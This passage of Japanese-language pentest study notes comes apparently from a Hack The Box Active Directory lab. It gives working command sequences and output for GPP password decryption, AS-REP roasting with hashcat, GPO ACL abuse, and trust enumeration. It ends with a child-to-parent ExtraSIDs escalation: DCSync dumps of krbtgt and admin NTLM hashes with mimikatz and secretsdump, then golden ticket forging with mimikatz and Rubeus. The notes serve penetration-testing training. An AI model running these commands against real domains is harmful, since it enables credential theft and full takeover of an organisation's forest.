PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
```

### SMBやSYSVOLスクリプトに含まれる認証情報
- 特に大規模な組織では、SYSVOL共有フォルダが情報の宝庫となっていることがある
- このフォルダには、バッチファイル、VBScript、PowerShellスクリプトなどが保存されており、**ドメイン内の認証済みユーザーであれば誰でも閲覧可能**
- このディレクトリを調査することで、スクリプト内に記述されたパスワードを発見できる場合がある
- 中にはすでに無効化されたアカウントや古いパスワードの情報かもしれませんが、運が良ければ有効な認証情報が見つかることもあるため、毎回チェックする価値がある

興味深いスクリプトを発見する
```sh
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

### グループポリシー設定（GPP）によるパスワードの漏洩
- 新しいGPP（Group Policy Preferences）が作成されると、SYSVOL共有上に .xml ファイルが生成される
- ポリシーが適用されるエンドポイントにもローカルキャッシュされる
- ローカルキャッシュの.xmlに含まれる情報
	- ドライブマッピング（例：drives.xml）
	- ローカルユーザーの作成
	- プリンタ設定の作成（例：printers.xml）
	- サービスの作成・更新（例：services.xml）
	- スケジュールされたタスクの作成（例：scheduledtasks.xml）
	- ローカル管理者のパスワード変更 など
- これらのファイルには様々な設定情報と一緒に、パスワードが含まれていることがある
- パスワードは cpassword という属性として保存され、AES-256ビット暗号化されている
	- しかし、Microsoftはその秘密鍵をMSDN上で公開してしまったため、誰でも復号可能
- SYSVOLはドメインコントローラーの共有フォルダであり、**すべての認証済みドメインユーザーが既定で読み取り可能**
- 誰でもこれらのXMLファイルからパスワードを取得できる可能性がある
- この問題は、**2014年にリリースされたMS14-025**で修正されました。以降は、**GPPを使ってパスワードを設定できなくなっている*
- しかし、SYSVOL内の既存の Groups.xml などは自動削除されない
- また、GPPポリシーを**OUからリンク解除せずに削除した場合、エンドポイントにキャッシュされたファイルは残り続ける**

gpp-decryptでパスワードを復号する
- 手動で cpassword の値を取得した場合、以下のように**gpp-decrypt ユーティリティを使って復号**することができる
```shell-session
snowyowl644@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```

#### GPPパスワードの探索と取得
- 検索は、手動で見つけるか、以下のツールを使える
	- Get-GPPPassword.ps1（PowerView）
	- MetasploitのGPP Postモジュール
	- Python/Ruby製の各種スクリプト
	- CrackMapExec のモジュール（gpp_password）

CrackMapExecのGPPに関連するモジュール
- gpp_autologin     : レジストリ.xmlから自動ログイン情報（ユーザー名とパスワード）を探す
- gpp_password      : GPPで配布されたアカウントの平文パスワードなどを取得

gpp_autologinを利用した認証情報取得
- GPPで自動ログイン設定（AutoLogon）がされている場合、Registry.xml に資格情報が平文で保存されることがある
- このファイルもSYSVOL上に置かれ、ドメイン内の認証済みユーザーであれば誰でも読み取り可能
- これはGPPのパスワード漏洩とは別の問題ですが、Microsoftは**これを制限しておらず、非常に脆弱なポイントとなっている**

すでに取得した認証情報を利用して、検索を行う
- 検索に引っかかる場合、ユーザー名・ドメイン・パスワードが出力される
```shell-session
snowyowl644@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```
- 対象アカウントが無効化されていたり、パスワード期限切れで使えない場合もある
- ですが、それでもパスワードが他で使い回されていないか調べる価値は大きい
	- 1つのGPPパスワードが、他のホストやユーザーへのアクセスをもたらす可能性がある

### ASREPRoasting (事前認証なしKerberosアカウントの攻撃)
- 事前認証なしKerberosアカウントの攻撃
- ASREPRoastingは、Kerberosの事前認証を無効にしたアカウントのTGTを取得→オフライン解析する攻撃。
- ドメイン参加していなくても攻撃可能。必要なのはユーザー名だけ。
- アカウントのパスワードが弱ければ、Hashcat等で簡単にクラック可能。
- 攻撃はWindowsでもLinuxでも実行でき、PowerView、Rubeus、Kerbrute、GetNPUsers.pyなど複数のツールが利用可能。
- 成功すれば、初期侵入や権限昇格の足がかりになる。
- パスワードが解読できなかったとしても、事前認証無効なアカウントの存在は報告対象にすべき脆弱性。

Kerberosの事前認証(Pre Authentication)の仕組み
- ユーザーはパスワードを入力し、時刻情報に暗号をかけてドメインコントローラー（DC）に送信する
- DCはその暗号を復号し、正しいパスワードが使われていることを確認すると、TGTを発行する
- **事前認証が無効になっているアカウントの場合**、攻撃者はそのアカウントに対してAS-REQ（認証要求）を送ることで、**事前認証を経ずにTGTを取得**できる
- このTGTは**オフラインでHashcatやJohn the Ripperなどを使って総当たり攻撃が可能**

ASREPRoastingとは
- ASREPRoastingは、Kerberoastingと似た攻撃ですが、**対象はTGS-REPではなくAS-REP**
- KerberoastingのようにSPN（Service Principal Name）は必要ない
- PowerViewやPowerShellのActive Directoryモジュールを使って**列挙可能**
- 攻撃者が対象アカウントに対してGenericWriteやGenericAllの権限を持っていれば、**事前認証不要の属性を一時的に付けてチケットを取得→解除**という流れも可能
- 攻撃の成否は、**対象アカウントのパスワードの強度**に依存

**事前認証不要アカウントの列挙**
- PowerViewを使用する
```powershell-session
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

**Rubeusを使ってAS-REPを取得（Hashcat形式）**
- Rubeusを使うと、オフラインクラッキング用に適した形式でAS-REPを取得できる
- /nowrapオプションを使うことで、ハッシュが折り返されず、Hashcatにそのまま食わせられるようになる
```powershell-session
PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

hashcatを使用してハッシュをクラックする
- モード : 18200を使える
```shell-session
snowyowl644@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
```

**Kerbruteを使ったAS-REPの自動取得（ユーザー列挙＋ハッシュ収集）**
- Kerbruteは、有効なユーザーを列挙し、事前認証が不要なユーザーのAS-REPも自動で取得する
```shell-session
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

**ImpacketのGetNPUsers.pyでAS-REP取得（Linux環境）**
- GetNPUsers.py は、ユーザーリストを元に事前認証不要のユーザーを判別し、AS-REPをHashcat形式で出力してくれる
```shell-session
impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```
- このツールは、リスト内の存在しないユーザーに対してはエラーを出しますが、有効なユーザーで事前認証不要なものが見つかれば、簡単に攻撃対象が手に入る

### GPO（グループポリシーオブジェクト）の悪用
- Group Policy（グループポリシー）は、Active Directory（AD）環境において、ユーザーやコンピューターオブジェクトに対して高度な設定を適用できる非常に強力な管理機能
- 本来は、ユーザー設定、OS構成、アプリケーション制御などを通じて**セキュリティ強化に貢献する機能**
- **攻撃者に悪用される可能性もある**点に注意が必要
- もし攻撃者が、ACL（アクセス制御リスト）の誤設定により**GPOに対する権限を得られた場合**、以下のようなことが可能になる
	- 横展開（Lateral Movement）
	- 権限昇格（Privilege Escalation）
	- ドメインの完全掌握
	- 永続化手段の確保（Persistence）
**GPOの列挙と攻撃方法を理解することは、堅牢に見える環境を突破するカギ**

GPOの誤設定を悪用してできること（一例）
- ユーザーに追加特権を付与する（例：SeDebugPrivilege, SeTakeOwnershipPrivilege, SeImpersonatePrivilege
- ローカル管理者ユーザーをホストに追加
- スケジュールされたタスクを即座に作成して任意のコマンドを実行
- マルウェアやリバースシェルを仕込んだスタートアップスクリプトの適用

#### GPOの列挙
モジュール内で使用しているPowerViewやBloodHoundを使えば、GPOに関する情報を列挙できる
他にも group3r, ADRecon, PingCastle なども、GPOのセキュリティ監査に役立つツール
```powershell
PS C:\htb> Get-DomainGPO |select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services
```

この一覧から、たとえば「cmd.exeの使用禁止」や「サービスアカウント用のパスワードポリシー」などのセキュリティ方針が垣間見える
また「AutoLogon」GPOが存在することから、**GPO内に平文パスワードが含まれている可能性**も考えられる

**組み込みの PowerShell Cmdlet を使った列挙**
- もし調査しているホストに**Group Policy Management ツールがインストールされていれば**、PowerShell標準の Get-GPO を使って同様の情報を取得できる
```powershell-session
PS C:\htb> Get-GPO -All | Select DisplayName
```

#### GPOに対する権限の調査
- ドメイン内の特定ユーザーやグループがどのGPOに対して操作権限を持っているかを確認する
- たとえば「Domain Users」グループに権限が付与されていないかを調べてみる

PowerViewを使ったGPOのACLチェック
```powershell-session
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             :
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
                        WriteOwner
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983095
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
AceType               : AccessAllowed
AceFlags              : ObjectInherit, ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit, ObjectInherit
PropagationFlags      : None
AuditFlags            : None
```
ここでは、「Domain Users」が該当のGPOに対して**WriteProperty** や **WriteDacl** などの強力な権限を持っていることが分かる
- これを利用すれば、そのGPOを操作して悪意ある設定を対象ホスト群に強制的に配布することが可能

#### GPO GUID からGPO名への変換
- 調査で得たGPOのGUIDから、その表示名を取得するには以下のようにする
```powershell-session
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

#### GPO誤設定の悪用（SharpGPOAbuse使用）
- このようなGPOの誤設定を悪用するには、**SharpGPOAbuse**のようなツールを使用する
- 以下のような攻撃が可能
	- 対象ホストのローカル管理者グループにユーザーを追加
	- リバースシェルを取得するための**即時スケジュールタスクの作成**
	- **悪意あるスタートアップスクリプトを配布**して永続的アクセスを確保
- GPOがリンクされているOU配下に数百台〜数千台のホストが存在する場合、**全ホストに意図せず変更を適用してしまう可能性があるため慎重に**行動する必要がある
- SharpGPOAbuseなどでは、**対象ホストやユーザーを指定してピンポイントで攻撃**することも可能

まとめ
- GPOはAD管理における強力な機能であると同時に、誤設定があれば攻撃対象にもなり得る。
- GPOの列挙と権限チェックを通じて、攻撃者は横展開や権限昇格、永続化を狙える。
- PowerView・BloodHound・SharpGPOAbuseなどのツールを駆使すれば、GPOの弱点を突くことが可能。
- 無差別な攻撃は危険。必ず対象ホスト・ユーザーを確認し、被害を最小化するよう意識する。

# ドメインの信頼関係
シナリオ
- 大規模な組織では、新しい企業を買収して傘下に収めることがよくある
- このとき、統合をスムーズに進めるための方法の一つが、「ドメイン信頼関係（Domain Trust）」の構築
- 信頼関係を結ぶことで、既存のオブジェクトをすべて移行する必要がなくなり、統合がはるかに迅速になる
	- しかし、便利な一方で、この信頼関係はセキュリティ上の弱点にもなり得る
	- たとえば、あるサブドメインに脆弱性や設定ミスがあると、そこを突破口としてターゲットのドメインに侵入されてしまう可能性がある
- 企業によっては、自社内の別部門（たとえば地理的に離れた地域の支社）や、MSP（マネージドサービスプロバイダー）、顧客企業など、他の組織との間にも信頼関係を構築することがある

## 概要
 ドメイントラストとは？
- 「信頼関係」とは、ドメイン間（またはフォレスト間）で認証を可能にする仕組み
- これにより、あるドメインに所属するユーザーが、別のドメイン内のリソースにアクセスしたり、管理作業を行ったりできる

 トラストの方向
- 一方向トラスト
	- 片方のドメインだけが相手を信頼する
- 双方向トラスト
	- お互いのドメインが相手を信頼する

 トラストの種類
- 親子トラスト（Parent-child）
	- 同じフォレスト内で自動的に作られる
	- 双方向で、信頼が連鎖する（トランジティブ）

- クロスリンクトラスト（Cross-link）
	- 子ドメイン同士を直接つなぐことで、認証の速度を向上

- 外部トラスト（External）
	- 別のフォレストにあるドメインとつなぐ
	- 信頼は連鎖しない（ノン・トランジティブ）

- ツリールートトラスト（Tree-root）
	- 同じフォレスト内で別のツリールートを作ったときにできる

- フォレストトラスト（Forest）
	- まったく別のフォレスト間で作る
	- 信頼は連鎖する（トランジティブ）

例
![](https://i.imgur.com/HAyxtQb.png)


- ESAE トラスト（バスチョンフォレスト）
	- 特別な管理用フォレストで、セキュリティ強化のために使用

トラストの特性
- トランジティブ（移譲可能）
	- 間接的な関係も信頼される
	- 例：AがBを信頼、BがCを信頼 → AはCも信頼する

- ノン・トランジティブ（移譲不可）
	- 信頼は直接つながった相手だけに限定される

![](https://i.imgur.com/6sS0A9F.png)

トラストの比較

| **トランジティブ Transitive（移譲可能）**                | **ノン・トランジティブ Non-Transitive（移譲不可）** |
| ------------------------------------------- | ----------------------------------- |
| 共有される、一対多の信頼関係                              | 直接的なトラストのみ                          |
| フォレスト内のすべてのドメインと信頼を共有                       | 次の階層の子ドメインには信頼を拡張しない                |
| フォレストトラスト、ツリールートトラスト、親子トラスト、クロスリンクトラストなどが該当 | 外部トラストやカスタム設定のトラストに多い               |
 イメージで理解する：荷物の受け取り例
- **トランジティブトラスト**  
  → 「家族の誰でも荷物を受け取っていいよ」と伝えてある状態  
  → 家（フォレスト）全体で信頼が共有されている

- **ノン・トランジティブトラスト**  
  → 「自分以外は荷物を受け取らないで」と配達員に伝えてある状態  
  → 信頼は本人と相手の間だけで、それ以外には広がらない

セキュリティ上の注意点
- ドメイントラストは設定ミスが起こりやすく、意図しない攻撃経路を作ってしまうことがある
- 「使いやすさ」を優先して構成されたトラストは、後にセキュリティリスクを見落とす原因になる
	- 企業の**合併・買収（M&A）**によって、双方向のトラストが設定されることがあります。
	- もし買収先のセキュリティ体制が不十分だった場合、思わぬリスクが本体側の環境に持ち込まれる可能性がある。

攻撃の一例
	•	攻撃者は、あなたの会社そのものではなく、買収した別会社のシステムを狙うことで、間接的に侵入を試みることがある

### トラスト関係の列挙
ドメイン間のトラスト（信頼関係）を調査するには、PowerShell の Get-ADTrust コマンドレットを使用できる
```powershell-session
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *
```
####  出力の見るところ
- IntraForest プロパティが有効
	- このドメインは同じフォレスト内の子ドメインであり、現在のドメインはそのルートドメイン（最上位）であることを示す
- ForestTransitive プロパティが True 
	- これは**フォレスト間トラスト**（または外部トラスト）であることがわかる

トラスト情報から見た攻撃面の要注意ポイント

Direction: BiDirectional
- 双方向トラストは、**どちらのドメインからもアクセス可能**
  - 攻撃者が片方のドメインに侵入できれば、もう片方にも**横展開（ラテラルムーブ）**が可能になる
  - **M&A で組織が吸収した先などは要チェック**

 ForestTransitive: True
- **フォレスト間トラスト + トランジティブ**ということは、他のフォレスト内の全ドメインにも信頼が伝播
  - 攻撃範囲が一気に広がる可能性
  - 認証・アクセス可能な資源が大量に存在しているかも

 SelectiveAuthentication: False
- 認証が**誰にでも許可されている**状態
  - 本来、信頼先のユーザーごとにアクセスを制限すべきだが、それがされていない
  - **Kerberoasting、AS-REP Roasting などのチケットベース攻撃**が可能なケースも

SIDFilteringQuarantined / SIDFilteringForestAware: False
- **SIDフィルタリングが無効** = SID偽装（SIDHistory悪用）に対して脆弱
  - 信頼先から偽装したSIDを使って、**特権昇格やドメイン横断アクセス**が可能になる恐れ
  - **過去の侵入テストでよく使われる攻撃ベクター**

 TGTDelegation: False ← 一見安全に見えるが…
- TGTの委任は無効化されているが、**他の委任設定（Unconstrained/Constrained）との組み合わせ次第で攻撃は可能**
  - ドメイン構成全体での委任設定の確認が必要

 TrustType: Uplevel
- Windows 2000以降のADドメイン間信頼
  - **古いバージョンのADやレガシー構成だとセキュリティ設定が緩いケースが多い**
  - NTLMが有効な場合、Pass-the-Hash や Relay 攻撃の対象になることも


攻撃に使える可能性があるツール
- **PowerView**: `Get-DomainTrust` で信頼一覧を取得
- **BloodHound**: トラスト関係・認証経路の可視化＆攻撃経路の分析
- **Impacket**: TGT/TGSまわりの攻撃に便利

### PowerView
現在のドメインに存在する**トラスト関係**を一覧表示できる
```powershell
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainTrust 
```

ドメイン間のトラストをマップ（視覚的に構造化）して確認可能
-　トラストの種類（親子、外部、フォレスト）や、**一方向か双方向か**も表示される
```powershell-session
PS C:\htb> Get-DomainTrustMapping
```

子ドメインのユーザーを確認する
- トラスト関係にある子ドメイン内の全ユーザー情報も取得できる
```powershell-session
PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

### netdom
netdom を使ったドメイントラストの確認
- netdom query コマンドで trust を指定することで、双方向のドメイントラストが存在することが確認できる
- ※「Not found」は詳細情報が取得できなかったことを意味する
```cmd-session
C:\htb> netdom query /domain:inlanefreight.local trust
```

netdom を使ったワークステーションとサーバーの確認
- ドメイン内に登録されているワークステーションやサーバーを一覧表示することも可能
- 機器名の横には、それがワークステーションかサーバーかが併記される
```cmd-session
C:\htb> netdom query /domain:inlanefreight.local dc
```

### BloodHound
- ドメイントラストの関係を視覚的にマッピングすることも可能
- 事前定義された「Map Domain Trusts」クエリを使えば、2つの双方向の信頼関係が存在していることが一目で確認できる
	- **Analysis ⇨ Domain Information ⇨ Map Domain Trusts**
![](https://i.imgur.com/BcuQqjL.png)


## 子ドメインから親ドメインへの攻撃
### Windows

#### SID History と ExtraSIDs 攻撃

SID History とは？
- Active Directory で使われる「過去のアカウントID（SID :セキュリティ識別子）」を記録する属性
	- ドメイン移行時などに、元アカウントのアクセス権を維持するために使われる
	- SID History に追加された SID も、ログイン時のトークンに含まれる
	- 結果として、元の権限を引き継いでリソースにアクセス可能

SID History を悪用する攻撃
- Mimikatz を使って「SID History インジェクション」が可能
	- 自分のアカウントに、管理者などの強力な SID を追加できる
	- トークンにその SID が含まれるため、高権限で振る舞える
	- 例：Domain Admin の SID を追加すると、ドメイン全体を操作可能に

ExtraSIDs 攻撃とは？
- 子ドメインから親ドメインへ侵害を広げる攻撃手法
	- フォレスト内の SID Filtering（SIDのチェック）が効かないのを悪用
	- 子ドメインのユーザーの SID History に「Enterprise Admins」の SID を追加
		- 本来は親ドメインにしか存在しないグループ
		- それだけでフォレスト全体の管理権限を得ることができる

 攻撃に必要な情報
- 子ドメインの [KRBTGT](https://adsecurity.org/?p=483)アカウントの NT ハッシュ
- 子ドメインの SID
- 子ドメイン内の任意のユーザー名（実在しなくても可）
- 子ドメインの FQDN（完全修飾ドメイン名）
- 親ドメインの Enterprise Admins グループの SID

 攻撃の流れ（ざっくり）
- 子ドメインをまず侵害（例：Domain Admin 権限を取得）
- Mimikatz で DCSync を実行し、KRBTGT のハッシュを抜く
- Mimikatz で偽の TGT（ゴールデンチケット）を作成
	- Golden Tickets :  **Kerberos認証の最上位チケットを偽造して、好きなユーザーになりすましてドメイン内を自由に動ける魔法のチケット**
	- SID History に Enterprise Admins の SID を追加
- フォレスト全体に対して管理者として振る舞えるようになる

 対策のヒント
- SID Filtering を正しく設定する（特にフォレスト信頼に対して）
- 定期的に KRBTGT アカウントのパスワードを変更する
- SID History の変更を監視する仕組みを導入する
- ドメイン間の信頼関係を最小限にする

##### PowerView・Mimikatz

**Mimikatz を用いた KRBTGT ハッシュの取得**
- SID（セキュリティ識別子）とNTLMハッシュを取得することができる
```powershell-session
PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

**子ドメインの SID を取得（PowerView 使用）**
-  Mimikatz の出力にも含まれているが、
```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainSID
```

**親ドメインの Enterprise Admins グループの SID を取得**
- PowerView の Get-DomainGroup または PowerShell の Get-ADGroup を使用できる
```powershell-session
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid                                    
-----------------                                       ---------                                    
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

**親ドメインの DC に対してアクセスできないことを事前に確認**
- まだ管理者権限がないのでアクセスできないことを確認する
```powershell-session
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

**Mimikatz を使って Golden Ticket を生成・使用する**
- Golden Tickets :  Kerberos認証の最上位チケットを偽造して、好きなユーザーになりすましてドメイン内を自由に動ける魔法のチケット

```powershell-session
PS C:\htb> mimikatz.exe
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

**klist を使って Kerberos チケットのメモリ確認**
- 存在しないユーザーの Kerberos チケットがメモリ上に存在していることを確認する
```powershell-session
PS C:\htb> klist

Current LogonId is 0:0xf6462

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/28/2022 19:59:50 (local)
        End Time:   3/25/2032 19:59:50 (local)
        Renew Time: 3/25/2032 19:59:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```
出力で注目するところ
- Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
	- 実在しないユーザーなのにチケットがある → Golden Ticket が注入されている証拠
- Ticket Flags に forwardable, renewable, initial, pre_authent など
	- 権限が強力で、長期間利用可能な設定
- End Time が 2032年！
	- 超長期間の有効期限は Golden Ticket の特徴の一つ
- これで親ドメインのリソースへ自由にアクセスできるようになる！

**親ドメインのDCのCドライブを一覧表示する**
```powershell-session
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
 Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\academy-ea-dc01.inlanefreight.local\c$

09/15/2018  12:19 AM    <DIR>          PerfLogs
10/06/2021  01:50 PM    <DIR>          Program Files
09/15/2018  02:06 AM    <DIR>          Program Files (x86)
11/19/2021  12:17 PM    <DIR>          Shares
10/06/2021  10:31 AM    <DIR>          Users
03/21/2022  12:18 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  18,080,178,176 bytes free
```
注目ポイント
- 以前はアクセスできなかった C ドライブが表示されている
→ Golden Ticket による管理者権限が効いている証拠


##### Rubeus
- Rubeus を使って同様の攻撃を実行することも可能

**実行前にアクセスできないことを再確認**
```powershell-session
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAcces 
   sException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
	
<SNIP> 
```

**Rubeus で Golden Ticket を作成する**
```powershell-session
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

**klist を使ったチケット確認**
- チケットがメモリ上に存在していることを確認する
```powershell-session
PS C:\htb> klist

Current LogonId is 0:0xf6495

Cached Tickets: (1)

#0>	Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
	Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent 
	Start Time: 3/29/2022 10:06:41 (local)
	End Time:   3/29/2022 20:06:41 (local)
	Renew Time: 4/5/2022 10:06:41 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 
```
- 作ったGolden Tickets(hacker @ LOGISTICS.INLANEFREIGHT.LOCAL)があることが確認できる

**lab_adm ユーザーに対して DCSync 攻撃を実施**
- DCSync 攻撃を使って、親ドメインの Domain Admin アカウントのハッシュを取得する
```powershell-session
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
```

**別ドメインを対象にした DCSync 攻撃を行う際の注意点**
- 複数のドメインが絡む状況では、対象ドメインを明示する必要がある
明示的に /domain を指定して DCSync を実行
```powershell-session
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```
注目ポイント
- /domain パラメータがあることで、子ドメイン側から親ドメインを正確に指定して攻撃できる
- 結果は先ほどと同様に NTLM ハッシュが取得できる

## Linux
Windowsで行った攻撃をLinuxからも行ってみる
攻撃に必要な情報は、変わらない
- 子ドメインのKRBTGTアカウントのハッシュ値
- 子ドメインのSID（セキュリティ識別子）
- 子ドメイン内のターゲットユーザー名（※存在する必要はありません）
- 子ドメインのFQDN（完全修飾ドメイン名）
- ルートドメイン（親ドメイン）のEnterprise AdminsグループのSID

### Secretsdump.py
**secretsdump.pyを使ったDCSyncの実行**
- このコマンドで、子ドメインのドメインコントローラ（DC）に対してDCSyncを行い、krbtgt アカウントのハッシュを抜き出している
- これにより、ゴールデンチケットの偽造が可能になる
```shell-session
snowyowl644@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
krbtgt:des-cbc-md5:fee04c3d026d7538
[*] Cleaning up...
```
出力で見るべきポイント
- krbtgt の NTLM ハッシュ（3つ目のフィールド）が最も重要です
- これを使えば、偽のチケットを作成し、親ドメインに対してもアクセス可能になる

**SIDブルートフォース**
- Impacketツールの lookupsid.py を使って、SIDブルートフォースを行い、子ドメインのSIDを特定
- このとき指定するIPアドレスは、子ドメインのドメインコントローラのもので、これがSIDの探索対象となる
- ドメインのSIDと各ユーザー・グループに対応するRID（Relative ID）を返してくれる
- SIDは DOMAIN_SID-RID の形式で表され、個別のユーザーSIDはこのように構成される
